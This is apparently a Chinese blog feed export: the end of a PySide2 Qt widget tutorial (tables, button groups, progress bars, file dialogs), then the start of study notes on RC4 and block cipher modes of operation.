<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QTableWidgetItem</span><br><span class="line"></span><br><span class="line">table.setItem(row, <span class="number">0</span>, QTableWidgetItem(<span class="string">&#x27;白月黑羽&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>如果单元格 <code>已经被设置过</code> 文本内容，</p>
<p><code>item</code> 方法可以获取指定位置的 QTableWidgetItem ，再调用这个对象的 <code>setText</code> 方法，就可以设置单元格文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.item(<span class="number">0</span>,<span class="number">0</span>).setText()</span><br></pre></td></tr></table></figure>
<p>就设置了 <code>第1行，第1列</code> 的单元格里面的文本。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.item(<span class="number">2</span>,<span class="number">4</span>).setText()</span><br></pre></td></tr></table></figure>
<p>就设置了 <code>第3行，第5列</code> 的单元格里面的文本。</p>
<p>如果希望某个单元格为 <strong>只读</strong>，不允许修改，可以使用QTableWidgetItem对象的 <code>setFlags</code> 方法，像这样</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QTableWidgetItem</span><br><span class="line"><span class="keyword">from</span> PySide2.QtCore <span class="keyword">import</span> Qt</span><br><span class="line"></span><br><span class="line">item = QTableWidgetItem(<span class="string">&#x27;白月黑羽&#x27;</span>)</span><br><span class="line">item.setFlags(Qt.ItemIsEnabled) <span class="comment">#### 参数名字段不允许修改</span></span><br><span class="line">table.setItem(row, <span class="number">0</span>, item)</span><br></pre></td></tr></table></figure>
<p>如果想文本内容 <strong>居中对齐</strong>，每个当对应的QTableWidgetItem 调用 setTextAlignment，如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QTableWidgetItem</span><br><span class="line"><span class="keyword">from</span> PySide2.QtCore <span class="keyword">import</span> Qt</span><br><span class="line"></span><br><span class="line">item = QTableWidgetItem()</span><br><span class="line">item.setText(<span class="string">&#x27;白月黑羽&#x27;</span>)</span><br><span class="line"><span class="comment">#### 文本居中</span></span><br><span class="line">item.setTextAlignment(Qt.AlignHCenter) </span><br><span class="line">table.setItem(row, <span class="number">0</span>, item)</span><br></pre></td></tr></table></figure>
<h6 id="方法：设定列宽、宽度自动缩放">方法：设定列宽、宽度自动缩放<a class="header-anchor" href="#方法：设定列宽、宽度自动缩放"> ¶ </a></h6>
<p>Qt Designer 上目前没法拖拽设定 每个列的宽度，只能在代码中指定。</p>
<p>如下所示</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### 设定第1列的宽度为 180像素</span></span><br><span class="line">table.setColumnWidth(<span class="number">0</span>, <span class="number">180</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 设定第2列的宽度为 100像素</span></span><br><span class="line">table.setColumnWidth(<span class="number">1</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p>如想让 表格控件宽度 随着父窗口的缩放自动缩放，可以</p>
<p>在 属性编辑器 中 勾选 <code>HorizontalHeaderStretchLastSection</code></p>
<p>或者使用下面代码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">table.horizontalHeader().setStretchLastSection(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h6 id="信号：单元格内容改动">信号：单元格内容改动<a class="header-anchor" href="#信号：单元格内容改动"> ¶ </a></h6>
<p>当用户修改了一个单元格的内容，会发出 <code>cellChanged</code> 信号，并且携带参数指明该单元格的行号和列号。</p>
<p>我们的代码可以对该信号进行相应的处理。</p>
<p>示例代码如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment">#### 指定单元格改动信号处理函数</span></span><br><span class="line">    self.ui.table.cellChanged.connect(self.cfgItemChanged)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cfgItemChanged</span>(<span class="params">self,row,column</span>):</span></span><br><span class="line">    <span class="comment">#### 获取更改内容</span></span><br><span class="line">    cfgName = self.ui.table.item(row, <span class="number">0</span>).text() <span class="comment">#### 首列为配置名称</span></span><br><span class="line">    cfgValue = self.ui.table.item(row, column).text()</span><br></pre></td></tr></table></figure>
<h5 id="单选按钮-和-按钮组">单选按钮 和 按钮组<a class="header-anchor" href="#单选按钮-和-按钮组"> ¶ </a></h5>
<p><code>QRadioButton</code> 是单选按钮</p>
<h6 id="说明">说明<a class="header-anchor" href="#说明"> ¶ </a></h6>
<p><code>同一个父窗口</code> 里面的多个单选按钮，只能选中一项。</p>
<p>如果你有多组单选按钮， 每组都应该有不同的父控件，或者不同的Layout。</p>
<p>通常建议：多组单选按钮，放到不同的 按钮组 <code>QButtonGroup</code> 中，按钮组就是父控件</p>
<h6 id="信号：选中状态改变">信号：选中状态改变<a class="header-anchor" href="#信号：选中状态改变"> ¶ </a></h6>
<p>如果用户操作点击了按钮组 <code>QButtonGroup</code> 中的一个按钮， QButtonGroup 就会发出 <code>buttonClicked</code> 信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">buttongroup.buttonClicked.connect(handleButtonClicked)</span><br></pre></td></tr></table></figure>
<p>然后，在处理函数中调用QButtonGroup对象的 <code>checkedButton()</code> 函数，返回值就是被选中的按钮对象。</p>
<p>再调用这个返回的按钮对象的 <code>text()</code> 方法得到界面文本，就可以知道是哪个选项被选中了。</p>
<h5 id="勾选按钮-和-按钮组">勾选按钮 和 按钮组<a class="header-anchor" href="#勾选按钮-和-按钮组"> ¶ </a></h5>
<p><code>QCheckBox</code> 是勾选按钮</p>
<h6 id="说明-2">说明<a class="header-anchor" href="#说明-2"> ¶ </a></h6>
<p>通常建议：多组勾选按钮，放到不同的 按钮组 <code>QButtonGroup</code> 中，按钮组就是父控件。</p>
<h6 id="信号：选中状态改变-2">信号：选中状态改变<a class="header-anchor" href="#信号：选中状态改变-2"> ¶ </a></h6>
<p>如果用户操作点击了按钮组 <code>QButtonGroup</code> 中的一个按钮， QButtonGroup 就会发出 <code>buttonClicked</code> 信号，可以这样指定处理该信号的函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">buttongroup.buttonClicked.connect(handleButtonClicked)</span><br></pre></td></tr></table></figure>
<p>然后，在处理函数中调用QButtonGroup对象的 <code>checkedButton()</code> 函数，返回值就是被选中的按钮对象。</p>
<p>再调用这个返回的按钮对象的 <code>text()</code> 方法得到界面文本，就可以知道是哪个选项被选中了。</p>
<h5 id="tab页控件">tab页控件<a class="header-anchor" href="#tab页控件"> ¶ </a></h5>
<p>我们可以通过tab页控件把界面分为好几各页面</p>
<p>通过Qt designer 只需要拖拽控件到各个页面即可。</p>
<p>要修改tab页的标题，可以先点击该tab页，然后在属性编辑器<code>currentTabText</code>修改</p>
<h6 id="tab页中布局Layout">tab页中布局Layout<a class="header-anchor" href="#tab页中布局Layout"> ¶ </a></h6>
<p>如果我们要在tab页上布局， 你可能会在对象查看器总直接右键点击该tab，可以你会发现 右键菜单里面没有布局项。</p>
<p>这是 Qt designer 非常坑爹的地方，我当时足足花了一个小时才找到方法。</p>
<ol>
<li>首先需要你在tab页上添加一个控件</li>
<li>然后点击 在对象查看器 右键点击上层 TabWidget ，这时，你就会发现有布局菜单了</li>
</ol>
<h5 id="进度条">进度条<a class="header-anchor" href="#进度条"> ¶ </a></h5>
<p><code>QProgressBar</code> 是进度条，如下图所示</p>
<h6 id="说明-3">说明<a class="header-anchor" href="#说明-3"> ¶ </a></h6>
<p>进度条也是一个常用的控件，当程序需要做一件比较耗费时间的任务（比如统计数据，下载文件等）时，可以用来向用户指示操作的进度。</p>
<p>而且有了进度显示，用户就知道应用程序仍在运行，并没有出问题。</p>
<p>QProgressBar进度条把每个进度称之为一个step（步骤）。</p>
<p>我们可以通过它的 <code>setRange</code> 方法设定步骤个数，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">progressBar.setRange(<span class="number">0</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p>就设定了，进度分为5步。</p>
<p>然后，通过 <code>setValue</code> 方法，指定当前完成到了哪一步，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">progressBar.setValue(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>就表示完成了 3/5， 也就是 60%， 进度条就会显示60%的进度。</p>
<p>可以使用reset()将进度条倒退到开头。</p>
<p>有时候我们的任务没法知道完成了多少，比如下载一个未知大小的文件。</p>
<p>这时，可以把range 范围都设置为0，这样，进度条会显示忙碌指示符，而不是显示进度百分比。</p>
<p>下面是一个进度条程序的示例代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QPushButton,  QProgressBar,QMessageBox</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span>  Thread</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stats</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.window = QMainWindow()</span><br><span class="line">        self.window.resize(<span class="number">500</span>, <span class="number">400</span>)</span><br><span class="line">        self.window.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">        self.progressBar = QProgressBar(self.window)</span><br><span class="line">        self.progressBar.resize(<span class="number">300</span>, <span class="number">20</span>)</span><br><span class="line">        self.progressBar.move(<span class="number">80</span>, <span class="number">30</span>)</span><br><span class="line">        <span class="comment">#### 进度是 0 - 5，</span></span><br><span class="line">        self.progressBar.setRange(<span class="number">0</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        self.button = QPushButton(<span class="string">&#x27;统计&#x27;</span>, self.window)</span><br><span class="line">        self.button.move(<span class="number">80</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">        self.button.clicked.connect(self.handleCalc)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#### 统计进行中标记，不能同时做两个统计</span></span><br><span class="line">        self.ongoing = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleCalc</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">workerThreadFunc</span>():</span></span><br><span class="line">            self.ongoing = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="comment">#### 设置进度值</span></span><br><span class="line">                self.progressBar.setValue(i)</span><br><span class="line">            self.ongoing = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.ongoing:</span><br><span class="line">            QMessageBox.warning(</span><br><span class="line">                self.window,</span><br><span class="line">                <span class="string">&#x27;警告&#x27;</span>,<span class="string">&#x27;任务进行中，请等待完成&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#### 通常任务执行比较耗时，应该在新的线程中进行</span></span><br><span class="line">        <span class="comment">#### 否则会阻塞主线程显示界面</span></span><br><span class="line">        worker = Thread(target=workerThreadFunc)</span><br><span class="line">        worker.start()</span><br><span class="line"></span><br><span class="line">app = QApplication([])</span><br><span class="line">stats = Stats()</span><br><span class="line">stats.window.show()</span><br><span class="line">app.exec_()</span><br></pre></td></tr></table></figure>
<p>上面的代码，运行时，会有很多告警，因为我们在新线程中操作界面对象，容易出问题。</p>
<p>更合理的方法是通过信号，在线程之间传递信息，对界面的操作都在主线程中完成。</p>
<p>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QPushButton,  QProgressBar,QMessageBox</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span>  Thread</span><br><span class="line"><span class="keyword">from</span> PySide2.QtCore <span class="keyword">import</span> Signal,QObject</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 信号库</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SignalStore</span>(<span class="params">QObject</span>):</span></span><br><span class="line">    <span class="comment">#### 定义一种信号</span></span><br><span class="line">    progress_update = Signal(<span class="built_in">int</span>)</span><br><span class="line">    <span class="comment">#### 还可以定义其他作用的信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 实例化</span></span><br><span class="line">so = SignalStore()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stats</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span> </span><br><span class="line">        <span class="comment">#### 连接信号到处理的slot函数</span></span><br><span class="line">        so.progress_update.connect(self.setProgress)</span><br><span class="line">        </span><br><span class="line">        self.window = QMainWindow()</span><br><span class="line">        self.window.resize(<span class="number">500</span>, <span class="number">400</span>)</span><br><span class="line">        self.window.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">        self.progressBar = QProgressBar(self.window)</span><br><span class="line">        self.progressBar.resize(<span class="number">300</span>, <span class="number">20</span>)</span><br><span class="line">        self.progressBar.move(<span class="number">80</span>, <span class="number">30</span>)</span><br><span class="line">        <span class="comment">#### 进度是 0 - 5，</span></span><br><span class="line">        self.progressBar.setRange(<span class="number">0</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        self.button = QPushButton(<span class="string">&#x27;统计&#x27;</span>, self.window)</span><br><span class="line">        self.button.move(<span class="number">80</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">        self.button.clicked.connect(self.handleCalc)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#### 统计进行中标记，不能同时做两个统计</span></span><br><span class="line">        self.ongoing = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleCalc</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">workerThreadFunc</span>():</span></span><br><span class="line">            self.ongoing = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="comment">#### 发出信息，通知主线程进行进度处理</span></span><br><span class="line">                so.progress_update.emit(i)</span><br><span class="line">            self.ongoing = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.ongoing:</span><br><span class="line">            QMessageBox.warning(</span><br><span class="line">                self.window,</span><br><span class="line">                <span class="string">&#x27;警告&#x27;</span>,<span class="string">&#x27;任务进行中，请等待完成&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        worker = Thread(target=workerThreadFunc)</span><br><span class="line">        worker.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#### 处理进度的slot函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setProgress</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        self.progressBar.setValue(value)</span><br><span class="line"></span><br><span class="line">app = QApplication([])</span><br><span class="line">stats = Stats()</span><br><span class="line">stats.window.show()</span><br><span class="line">app.exec_()</span><br></pre></td></tr></table></figure>
<h5 id="数字输入框">数字输入框<a class="header-anchor" href="#数字输入框"> ¶ </a></h5>
<p><code>QSpinBox</code> 是数字输入框，可以输入或使用上下箭头选择数字</p>
<h6 id="获取数字">获取数字<a class="header-anchor" href="#获取数字"> ¶ </a></h6>
<p>通过 <code>value</code> 方法获取编辑框内的文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">number = box.value()</span><br></pre></td></tr></table></figure>
<p>注意：返回的是整数对象，不是字符串</p>
<h6 id="方法：设置数字">方法：设置数字<a class="header-anchor" href="#方法：设置数字"> ¶ </a></h6>
<p>通过 <code>setValue</code> 方法可以设置提示文本内容，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">box.setValue(<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日期控件">日期控件<a class="header-anchor" href="#日期控件"> ¶ </a></h5>
<p><code>QDateEdit</code> 类可以用来选择日期时间</p>
<h6 id="获取日期">获取日期<a class="header-anchor" href="#获取日期"> ¶ </a></h6>
<p>当用户点击日期时间控件并且选取了 日期和时间，后来程序要获取这个控件里面选定的日期时间，可以使用date方法获取日期对象。</p>
<p>如下所示</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### 返回 PySide2.QtCore.QDate 对象</span></span><br><span class="line">qdate = dateEdit.date()</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 可以转化为 指定格式的字符串</span></span><br><span class="line">dateStr = qdate.toString(<span class="string">&#x27;yyyy-MM-dd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 也可以获取年月日 对应的数字 ，比如日期是2020年5月2号</span></span><br><span class="line">year = qdate.year()   <span class="comment">#### 返回 2020</span></span><br><span class="line">month = qdate.month() <span class="comment">#### 返回 5</span></span><br><span class="line">day = qdate.day()     <span class="comment">#### 返回 2</span></span><br></pre></td></tr></table></figure>
<p>QDate 对象的具体说明<a href="https://doc.qt.io/qtforpython-5.12/PySide2/QtCore/QDate.html">参考官方文档</a></p>
<h5 id="选择文件框">选择文件框<a class="header-anchor" href="#选择文件框"> ¶ </a></h5>
<p><code>QFileDialog</code> 类可以用来选择文件或者目录</p>
<h6 id="选择目录">选择目录<a class="header-anchor" href="#选择目录"> ¶ </a></h6>
<p>通过 <code>getExistingDirectory 静态方法</code> 选择目录。</p>
<p>该方法，第一个参数是父窗口对象，第二个参数是选择框显示的标题。</p>
<p>比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QFileDialog</span><br><span class="line"></span><br><span class="line">filePath = QFileDialog.getExistingDirectory(self.ui, <span class="string">&quot;选择存储路径&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>返回值即为选择的路径字符串。</p>
<p>如果用户点击了 选择框的 取消选择按钮，返回 空字符串。</p>
<h6 id="选择单个文件">选择单个文件<a class="header-anchor" href="#选择单个文件"> ¶ </a></h6>
<p>如果你想弹出文件选择框，选择一个 <code>已经存在</code> 的文件，可以使用 QFileDialog 静态方法 <code>getOpenFileName</code> ，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QFileDialog</span><br><span class="line"></span><br><span class="line">filePath, _  = QFileDialog.getOpenFileName(</span><br><span class="line">            self.ui,             <span class="comment">#### 父窗口对象</span></span><br><span class="line">            <span class="string">&quot;选择你要上传的图片&quot;</span>, <span class="comment">#### 标题</span></span><br><span class="line">            <span class="string">r&quot;d:\\data&quot;</span>,        <span class="comment">#### 起始目录</span></span><br><span class="line">            <span class="string">&quot;图片类型 (*.png *.jpg *.bmp)&quot;</span> <span class="comment">#### 选择类型过滤项，过滤内容在括号中</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<p>该方法返回值 是一个元组，第一个元素是选择的文件路径，第二个元素是文件类型，如果你只想获取文件路径即可，可以采用上面的代码写法。</p>
<p>如果用户点击了 选择框的 取消选择按钮，返回 空字符串。</p>
<p>如果你想弹出文件选择框，选择路径和文件名，来 <code>保存一个文件</code> ，可以使用 QFileDialog 静态方法 <code>getSaveFileName</code> ，比如</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QFileDialog</span><br><span class="line"></span><br><span class="line">filePath, _  = QFileDialog.getSaveFileName(</span><br><span class="line">            self.ui,             <span class="comment">#### 父窗口对象</span></span><br><span class="line">            <span class="string">&quot;保存文件&quot;</span>, <span class="comment">#### 标题</span></span><br><span class="line">            <span class="string">r&quot;d:\\data&quot;</span>,        <span class="comment">#### 起始目录</span></span><br><span class="line">            <span class="string">&quot;json类型 (*.json)&quot;</span> <span class="comment">#### 选择类型过滤项，过滤内容在括号中</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<h6 id="选择多个文件">选择多个文件<a class="header-anchor" href="#选择多个文件"> ¶ </a></h6>
<p>如果要选择多个文件，使用 <code>getOpenFileNames 静态方法</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide2.QtWidgets <span class="keyword">import</span> QFileDialog</span><br><span class="line"></span><br><span class="line">filePaths, _  = QFileDialog.getOpenFileNames(</span><br><span class="line">            self.ui,             <span class="comment">#### 父窗口对象</span></span><br><span class="line">            <span class="string">&quot;选择你要上传的图片&quot;</span>, <span class="comment">#### 标题</span></span><br><span class="line">            <span class="string">r&quot;d:\\data&quot;</span>,        <span class="comment">#### 起始目录</span></span><br><span class="line">            <span class="string">&quot;图片类型 (*.png *.jpg *.bmp)&quot;</span> <span class="comment">#### 选择类型过滤项，过滤内容在括号中</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<p>上例中 filePaths 对应的返回值是一个列表，里面包含了选择的文件。</p>
<p>如果用户点击了 选择框的 取消选择按钮，返回 空列表。</p>
<h2 id="库方法">库方法<a class="header-anchor" href="#库方法"> ¶ </a></h2>
<h2 id="random-库">random 库<a class="header-anchor" href="#random-库"> ¶ </a></h2>
<table>
<thead>
<tr>
<th style="text-align:center">函数/方法</th>
<th style="text-align:center">参数</th>
<th style="text-align:center">返回值/作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">random.choice()</td>
<td style="text-align:center">一个序列</td>
<td style="text-align:center">随机返回序列中的一个元素</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>对加密算法的学习</title>
    <url>/AndroidReverse/2022/Learning_about_cryptographic_algorithms/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="序列密码-流密码">序列密码(流密码)<a class="header-anchor" href="#序列密码-流密码"> ¶ </a></h1>
<p>将明文消息按字符逐位进行加密。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//stream_cipher.png" alt="stream_cipher"></p>
<h2 id="RC4">RC4<a class="header-anchor" href="#RC4"> ¶ </a></h2>
<p>RC4(Rivest Cipher 4)是一种流加密算法，密钥长度可变。在给定一密钥时，会生成一固定序列的字节流，用于和明文进行异或。</p>
<p>用途：WEP、WPA、SSL、TLS</p>
<h3 id="原理">原理<a class="header-anchor" href="#原理"> ¶ </a></h3>
<p>RSA主要包括初始化算法(KSA)和伪随机子密码生成算法(PRGA)，其核心部分的S-box长度可为任意，但一般为256字节。</p>
<p>RC4算法的关键是根据明文和密钥生成相应的密钥流，密钥流长度和明文长度相等，<code>密文[i] = 明文[i] ^ 密钥流[i]</code></p>
<h4 id="初始化算法-KSA">初始化算法(KSA)<a class="header-anchor" href="#初始化算法-KSA"> ¶ </a></h4>
<ol>
<li>
<p>初始化存储0-255字节的S-box和T-box</p>
<p>填充key到256个字节数组中称为T-box，（key不满256则循环填充、超过则只取前256）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">N = <span class="number">256</span>;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i &lt; N;i++) &#123;</span><br><span class="line">    S[i] = i;</span><br><span class="line">    T[i] = key[i % key_len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//rc4_s_t.png" alt="img"></p>
</li>
<li>
<p>初始置换状态向量S-box</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">N = <span class="number">256</span>;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>, j=<span class="number">0</span>; i&lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line">	j=(j+S[i]+T[i])% N;</span><br><span class="line">    <span class="comment">// 对两数进行交换</span></span><br><span class="line">	swap(S[i], S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//rc4_s.png" alt="img"></p>
</li>
</ol>
<h4 id="伪随机子密码生成算法-PRGA">伪随机子密码生成算法(PRGA)<a class="header-anchor" href="#伪随机子密码生成算法-PRGA"> ¶ </a></h4>
<p>产生密钥流，并与明文异或得到密文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">    </span><br><span class="line">    tmp = S[i];</span><br><span class="line">    S[i] = S[j]; <span class="comment">//交换S[x]和S[y]</span></span><br><span class="line">    S[j] = tmp;</span><br><span class="line">    </span><br><span class="line">    t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">    ckey = S[t];	<span class="comment">// ckey为生成的密钥流</span></span><br><span class="line">    data[k] ^= ckey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//rc4_key.png" alt="img"></p>
<h3 id="实现">实现<a class="header-anchor" href="#实现"> ¶ </a></h3>
<h4 id="C语言">C语言<a class="header-anchor" href="#C语言"> ¶ </a></h4>
<script src="https://gist.github.com/Forgo7ten/28a2c20ade914e962a8c5714d36ccbca.js"></script>
<h1 id="分组密码-块加密">分组密码(块加密)<a class="header-anchor" href="#分组密码-块加密"> ¶ </a></h1>
<p>将明文消息分组(每组多个字符)，逐组进行加密。</p>
<h2 id="分组密码概念">分组密码概念<a class="header-anchor" href="#分组密码概念"> ¶ </a></h2>
<ul>
<li>padding，即 padding(填补) 到指定分组长度。</li>
<li>分组加密工作模式，即明文分组加密的方式。</li>
</ul>
<p>分组密码最后不足一个区块的大小，称为短块，短块的处理方法有填充法、流密码加密法、密文挪用技术。</p>
<h3 id="分组密码五种工作模式">分组密码五种工作模式<a class="header-anchor" href="#分组密码五种工作模式"> ¶ </a></h3>
<p>DES算法工作模式被标准化，根据数据加密时每个加密区块间的关联方式来区分，可以分为以下4种：</p>
<ul>
<li>电子密码本模式(Electronic Code Book, ECB)</li>
<li>密文链接模式(Cipher Book Chaining, CBC)</li>
<li>密文反馈模式(Cipher Feed Back, CFB)</li>
<li>输出反馈模式(Output Feed Back, OFB)</li>
<li>（AES标准额外添加一种）计数器模式(Counter, CTR)</li>
</ul>
<p>这些工作模式可适用于各种分组密码算法</p>
<table>
<thead>
<tr>
<th style="text-align:center">模式</th>
<th style="text-align:center">描述</th>
<th style="text-align:center">使用途径</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ECB（电码本模式）</td>
<td style="text-align:center">用于每一个明文组<strong>独立</strong>的用同一密钥加密</td>
<td style="text-align:center">传送短数据 ( 如一个加密密钥）</td>
</tr>
<tr>
<td style="text-align:center">CBC（密码分组链接模式）</td>
<td style="text-align:center">加密算法的输入是当前明文组与前一密文组的异或</td>
<td style="text-align:center">传送数据分组；认证</td>
</tr>
<tr>
<td style="text-align:center">CFB（密码反馈模式）</td>
<td style="text-align:center">每次只处理输入的 j 比特 , 将上一次的密文用作加密算法的输入以产生伪随机输出 , 该输出再与当前明文异或以产生当前密文</td>
<td style="text-align:center">传送数据分组；认证</td>
</tr>
<tr>
<td style="text-align:center">OFB（输出反馈模式）</td>
<td style="text-align:center">与 CFB 类似 ,不同之处是本次加密算法的输入为前一次加密算法的输出</td>
<td style="text-align:center">有扰信道传送数据</td>
</tr>
<tr>
<td style="text-align:center">CTR (计数器模式)</td>
<td style="text-align:center">与CFB、OFB些许类似，但不同之处是定义一个计数器来加密后进行异或</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h4 id="电子密码本模式-ECB">电子密码本模式(ECB)<a class="header-anchor" href="#电子密码本模式-ECB"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//ECB.png" alt="ECB图解"></p>
